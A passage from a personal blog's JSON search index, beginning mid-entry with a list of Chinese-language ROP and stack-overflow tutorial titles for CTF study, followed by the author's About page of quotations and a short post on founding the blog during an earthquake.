ROP\n系统调用\nGithub上Libc版本库\nLibcSearcher工具\n现代栈溢出利用技术基础：ROP\n一步一步学ROP之linux_x86篇\n一步一步学ROP之linux_x64篇\n手把手教你栈溢出从入门到放弃（上）\n手把手教你栈溢出从入门到放弃（下）\nLinux下pwn从入门到放弃\n","date":"2019-06-20T00:06:21+08:00","permalink":"https://wander1ng.com/post/ctf-wiki/","section":"post","tags":["CTF"],"title":"CTF Wiki"},{"categories":null,"contents":"Cybersecurity Researcher(Focusing on Advanced Persistent Threat)\nInterest: Reading | Photography | Travel | Wander | Cooking\nWeChat ID: WanderingtotheMoon (どうぞよろしくお願いいたします)\n微信公众号：清夜无尘的一方天地 (欢迎关注~)\n[不要温和地走进那个良夜]——Dylan Thomas\n[我与我周旋久 宁作我]——《世说新语》\n[去爱去生活去受伤]——《我的阿勒泰》\n[A rolling stone gathers no moss]——Publiius Syrus\n[湖中焉得更有此人！]——张岱\n[身体为了繁衍留下后代，精神为了繁衍留下文字。]——我自己\n[阅读只是在被动接受，你读过什么并不代表你是什么。书写才能定义自我，你所写下的就是你自己。]——我自己\n[去记录，记录能够对抗生命的流逝。]——我自己\n[在目力所及的将来，唯有数字游民一种生活方式能够被自我接受。]——我自己\n[自信来自于直面困难并将之击败。]——我自己\n[时间规划的本质不在与时间本身，身处信息过载的时代，选择去做什么事比追求高效更重要，提高认知。]——我自己\n[想要成为独特的人，必须承受他人不解的目光，付出超出一般人的努力，又勇气做和大部分人不同的抉择。]——我自己\n[不玩他们的游戏]——《好东西》\n[生命的意义是什么呢？很大的问题，对应着哲学三问里的“我要到哪里去？”。目前的答案：到远方去！无法接受同质化的安稳生活，但也要为之做好付出更艰辛努力的觉悟]——我自己\n[生命所有的追求，都是为了更好的自我。与其现在的执着不放手，不如在顶峰相见。]——我自己\n[我在这篇文章里说，莎士比亚有个妹妹，但你不要去锡德尼·李爵士的莎士比亚传里找她。她年纪轻轻就死了，——可惜，一个字都没来得及写。她葬在大象城堡对面停公交车的地方。我相信，这位从未写下一行字、葬在十字路口的诗人还活着。她活在你我之中，活在许多其他女性心中。她们今晚不在这儿，而是在刷洗碗筷，哄孩子睡觉。但她还活着，伟大的诗人永垂不朽，是永远的存在，时机一到，她就会化作肉身来到我们中间。我想，这个机会就要到来，这个机会就在你们手中。我相信，等我们再活一个世纪，——我说的是人类的共同生活、真实的生活，而不是我们每个人的小小的人生，等我们有了一年五百磅和自己的房间；等我们养成了自由的习惯，勇于写下自己心中所想……]——Virginia Woolf\n","date":"2019-06-19T22:02:31+08:00","permalink":"https://wander1ng.com/about/","section":"","tags":["Meta"],"title":"About"},{"categories":null,"contents":"Earthquake and Blog\n第一次建博客的那天晚上，人在学校宿舍，遭遇了人生第一次感到恐慌的地震，震级为6.0级，以至于之后的半年常常在半夜惊醒。\n地震这事，大概就和吃云南野生菌中毒一样，没有必要执着于去经历一次，可是经历过一次真的永生难忘\u0026hellip;\n又想到《西游记》中齐天大圣也是从一块灵石降世，这地震大抵也是我的博客第一声“Hello World\u0026quot;引发的天地异象~\n","date":"2019-06-19T02:56:00+08:00","permalink":"https://wander1ng.com/post/gensis/","section":"post","tags":["Meta"],"title":"Gensis"}]